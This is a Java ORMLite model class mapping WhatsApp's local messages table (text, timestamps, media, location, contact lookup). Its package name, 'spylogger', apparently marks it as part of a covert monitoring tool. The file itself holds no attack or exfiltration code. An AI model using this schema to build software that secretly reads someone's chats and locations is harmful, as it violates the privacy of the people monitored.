package com.gravatasufoca.spylogger.model.whatsapp;

import android.content.ContentResolver;

import com.gravatasufoca.spylogger.model.EntidadeAbstrata;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.utils.Utils;
import com.j256.ormlite.field.DataType;
import com.j256.ormlite.field.DatabaseField;
import com.j256.ormlite.table.DatabaseTable;

import java.io.Serializable;
import java.util.Date;

import lombok.Getter;
import lombok.Setter;

@Setter
@Getter
@DatabaseTable
public class Messages extends EntidadeAbstrata implements Comparable<Messages>,Mensagem{
	private static final long serialVersionUID = -4679985146526783051L;

	public Messages() {
	}

	@Override
	public Serializable getId() {
		// TODO Auto-generated method stub
		return _id;
	}

	@DatabaseField(generatedId=true)
	private Integer _id;

//	@DatabaseField()
//	private String key_remote_jid;

	@DatabaseField()
	private int key_from_me;

	@DatabaseField()
	private String key_id;

	@DatabaseField()
	private int status;

	@DatabaseField()
	private int needs_push;

	@DatabaseField()
	private String data;

	@DatabaseField(dataType=DataType.DATE_LONG)
	private Date timestamp;

	@DatabaseField()
	private String media_url;

	@DatabaseField()
	private String media_mime_type;

	@DatabaseField()
	private String media_wa_type;

	@DatabaseField()
	private String media_size;

	@DatabaseField()
	private String media_name;

	@DatabaseField()
	private String media_hash;

	@DatabaseField()
	private double latitude;

	@DatabaseField()
	private double longitude;

	@DatabaseField(dataType=DataType.BYTE_ARRAY)
	private byte[] thumb_image;

	@DatabaseField()
	private String remote_resource;

	@DatabaseField(dataType=DataType.DATE_LONG)
	private Date received_timestamp;

	@DatabaseField()
	private int send_timestamp;

	@DatabaseField()
	private int receipt_server_timestamp;

	@DatabaseField( dataType = DataType.BYTE_ARRAY)
	private byte[] raw_data=null;

	@DatabaseField()
	private int recipient_count;

	@DatabaseField()
	private int media_duration;

	@DatabaseField()
	private int origin;

	@DatabaseField(foreign=true, foreignColumnName="key_remote_jid",columnName="key_remote_jid")
	private ChatList chatList;

	public String getKey_remote_jid() {
		return chatList.getKey_remote_jid();
	}
//
//	public void setKey_remote_jid(String key_remote_jid) {
//		this.key_remote_jid = key_remote_jid;
//	}

	public String getData() {
		if(data==null)
			data="";
		return data;
	}

	@Override
	public int compareTo(Messages another) {
		if(getTimestamp().after(another.getTimestamp()))
			return 1;
		else if(getTimestamp().before(another.getTimestamp()))
			return -1;
		return 0;
	}

	public boolean isVideo(){
		return getMedia_wa_type().trim().equals("3");
	}
	public boolean isAudio(){
		return getMedia_wa_type().trim().equals("2");
	}
	public boolean isImagem(){
		return getMedia_wa_type().trim().equals("1");
	}
	public boolean isMap(){
		return getMedia_wa_type().trim().equals("5");
	}

	public boolean isMedia(){
		return isVideo() || isAudio() || isMap() || isImagem();
	}

	public String getNome(ContentResolver contentResolver) {
		if(getKey_from_me()==1)
			return "";
		String nome = getRemote_resource();
		try {
			nome = Utils.getContactDisplayNameByNumber(getRemote_resource(),
					contentResolver);
		} catch (Exception e) {
		}
		return nome;
	}

}
